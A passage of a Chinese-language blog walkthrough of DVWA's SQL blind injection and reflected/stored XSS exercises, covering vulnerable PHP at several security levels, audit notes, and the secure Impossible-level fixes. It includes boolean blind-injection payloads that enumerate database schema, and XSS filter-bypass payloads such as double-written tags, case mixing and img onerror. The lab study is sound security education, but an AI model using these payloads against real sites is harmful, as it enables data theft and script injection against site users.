显示存在</p><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><ul><li>猜解数据<br>同样采用二分法。</li></ul><h3 id="Medium-6"><a href="#Medium-6" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ]  ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-19"><a href="#审计-19" class="headerlink" title="审计"></a>审计</h4><p>，Medium级别的代码利用mysql_real_escape_string函数对特殊符号</p><p>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入</p><h4 id="漏洞利用-15"><a href="#漏洞利用-15" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然前端使用了下拉选择菜单，但我们依然可以通过抓包改参数id，提交恶意构造的查询参数。</p><p>之前已经介绍了详细的盲注流程，这里就简要演示几个。</p><p>首先是基于布尔的盲注：</p><p>抓包改参数id为1 and length(database())=4 #，显示存在，说明数据库名的长度为4个字符；</p><p>抓包改参数id为1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，说明数据中的第一个表名长度为9个字符；</p><p>抓包改参数id为1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段。</p><h3 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_COOKIE</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Check database </span><br><span class="line">        <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>' LIMIT 1;"</span>; </span><br><span class="line">        <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line">    </span><br><span class="line">        // Get results </span><br><span class="line">        <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // Might sleep a random amount </span><br><span class="line">            <span class="keyword">if</span>( rand( 0, 5 ) == 3 ) &#123; </span><br><span class="line">                sleep( rand( 2, 4 ) ); </span><br><span class="line">            &#125; </span><br><span class="line">    </span><br><span class="line">            // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">            header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line">    </span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">        mysql_close(); </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    ?&gt; </span><br><span class="line">``` </span><br><span class="line"><span class="comment">#### 审计</span></span><br><span class="line">High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</span><br><span class="line"></span><br><span class="line"><span class="comment">#### 漏洞利用</span></span><br><span class="line">虽然添加了LIMIT 1，但是我们可以通过<span class="comment">#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and length(database())=4 <span class="comment">#，显示存在，说明数据库名的长度为4个字符；</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and length(substr(( select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1))=9 <span class="comment">#，显示存在，说明数据中的第一个表名长度为9个字符；</span></span><br><span class="line"></span><br><span class="line">抓包将cookie中参数id改为1’ and (select count(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0×7573657273)=8 <span class="comment">#，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Impossible</span></span><br><span class="line"></span><br><span class="line">``` bash</span><br><span class="line">    &lt;?php </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">        // Check Anti-CSRF token </span><br><span class="line">        checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    </span><br><span class="line">        // Get input </span><br><span class="line">        <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    </span><br><span class="line">        // Was a number entered? </span><br><span class="line">        <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">            // Check the database </span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;bindParam( <span class="string">':id'</span>, <span class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">            <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">    </span><br><span class="line">            // Get results </span><br><span class="line">            <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == 1 ) &#123; </span><br><span class="line">                // Feedback <span class="keyword">for</span> end user </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123; </span><br><span class="line">                // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">                header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line">    </span><br><span class="line">                // Feedback <span class="keyword">for</span> end user </span><br><span class="line">                <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    // Generate Anti-CSRF token </span><br><span class="line">    generateSessionToken(); </span><br><span class="line">    </span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure><h3 id="审计-20"><a href="#审计-20" class="headerlink" title="审计"></a>审计</h3><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>经过后端，不经过数据库</p><h3 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">// Is there any input? </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line"></span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-21"><a href="#审计-21" class="headerlink" title="审计"></a>审计</h4><p>可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p><h4 id="漏洞利用-16"><a href="#漏洞利用-16" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，</span><br></pre></td></tr></table></figure><p>成功弹框：<br><img src="xss01.png" alt=""></p><h3 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="comment">// Is there any input? </span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123; </span></span><br><span class="line"><span class="php">    <span class="comment">// Get input </span></span></span><br><span class="line"><span class="php">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] ); </span></span><br><span class="line"><span class="php">    <span class="comment">// Feedback for end user </span></span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>; </span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h4 id="审计-22"><a href="#审计-22" class="headerlink" title="审计"></a>审计</h4><p>可以看到，这里对输入进行了过滤，基于黑名单的思想，使用str_replace函数将输入中的<script>删除，这种防护机制是可以被轻松绕过的。</p><h4 id="漏洞利用-17"><a href="#漏洞利用-17" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>双写绕过</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&lt;sc&lt;script&gt;ript&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>成功弹框：<br><img src="xss01.png" alt=""></p><ul><li>大小写混淆绕过</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入&lt;ScRipt&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，成功弹框：</span><br></pre></td></tr></table></figure><p><img src="xss01.png" alt=""></p><h3 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); </span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Hello <span class="variable">$&#123;name&#125;</span>&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-23"><a href="#审计-23" class="headerlink" title="审计"></a>审计</h4><p>High级别的代码同样使用黑名单过滤输入，preg_replace() 函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p><h4 id="漏洞利用-18"><a href="#漏洞利用-18" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>无法使用<script>标签注入XSS代码，但是可以通过img、body等标签的事件或者iframe等标签的src注入恶意的js代码。</p><p>输入</p><pre><code>&lt;img src=1 onerro r=aler\t(/给你试下xss攻击/)&gt;</code></pre><p>成功弹框：<br><img src="xss01.png" alt=""></p><h3 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">// Is there any input? </span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] != NULL ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$name</span> = htmlspecialchars( <span class="variable">$_GET</span>[ <span class="string">'name'</span> ] ); </span><br><span class="line">    // Feedback <span class="keyword">for</span> end user </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;Hello <span class="variable">$&#123;name&#125;</span>&lt;/pre&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-24"><a href="#审计-24" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码使用htmlspecialchars函数把预定义的字符&amp;、”、 ’、&lt;、&gt;转换为 HTML 实体，防止浏览器将其作为HTML元素</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>经过后端，经过数据库    </p><h3 id="Low-6"><a href="#Low-6" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = stripslashes( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-25"><a href="#审计-25" class="headerlink" title="审计"></a>审计</h4><p>相关函数介绍</p><p>trim(string,charlist)</p><p>函数移除字符串两侧的空白字符或其他预定义字符，预定义字符包括、\t、\n、\x0B、\r以及空格，可选参数charlist支持添加额外需要删除的字符。</p><p>mysql_real_escape_string(string,connection)</p><p>函数会对字符串中的特殊符号（\x00，\n，\r，\，‘，“，\x1a）进行转义。</p><p>stripslashes(string)</p><p>函数删除字符串中的反斜杠。</p><p>可以看到，对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p><h4 id="漏洞利用-19"><a href="#漏洞利用-19" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>message一栏输入</p><pre><code>&lt;script【】&gt;aler\t(/给你试下xss攻击/)&lt;/script&gt;，</code></pre><p>成功弹框：</p><p>name一栏前端有字数限制，直接改前端的maxlength，可以绕过，改为<script>alert(/name/)</script>：</p><h3 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-26"><a href="#审计-26" class="headerlink" title="审计"></a>审计</h4><p>strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签，但允许使用<b>标签。</b></p><p>addslashes() 函数返回在预定义字符（单引号、双引号、反斜杠、NULL）之前添加反斜杠的字符串。</p><p>可以看到，由于对message参数使用了htmlspecialchars函数进行编码，因此无法再通过message参数注入XSS代码，但是对于name参数，只是简单过滤了<script>字符串，仍然存在存储型的XSS。</p><h4 id="漏洞利用-20"><a href="#漏洞利用-20" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>双写绕过<br>前端改maxlength限制，在name中输入&lt;sc<script>ript&gt;alert(/xss/)</script>:<li><p>大小写混淆绕过<br>前端改maxlength限制改name参数为</p><p>  &lt;Script【】&gt;alert(/xss/):</p></li></p><h3 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span class="variable">$_POST</span>[ <span class="string">'txtName'</span> ] ); </span><br><span class="line">    // Sanitize message input </span><br><span class="line">    <span class="variable">$message</span> = strip_tags( addslashes( <span class="variable">$message</span> ) ); </span><br><span class="line">    <span class="variable">$message</span> = mysql_real_escape_string( <span class="variable">$message</span> ); </span><br><span class="line">    <span class="variable">$message</span> = htmlspecialchars( <span class="variable">$message</span> ); </span><br><span class="line">    // Sanitize name input </span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, <span class="variable">$name</span> ); </span><br><span class="line">    <span class="variable">$name</span> = mysql_real_escape_string( <span class="variable">$name</span> ); </span><br><span class="line">    // Update database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="variable">$message</span>', '<span class="variable">$name</span>' );"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-27"><a href="#审计-27" class="headerlink" title="审计"></a>审计</h4><p>使用正则表达式过滤了<script>标签，但是却忽略了img、iframe等其它危险的标签，因此name参数上述级别的<br>修改前端限制输入name为</p><pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre><h3 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'btnSign'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$message</span> = trim( <span class="variable">$_POST</span>[ <span class="string">'mtxMessage'</span> ] ); </span><br><span class="line">    <span class="variable">$name</span>    = trim( <span 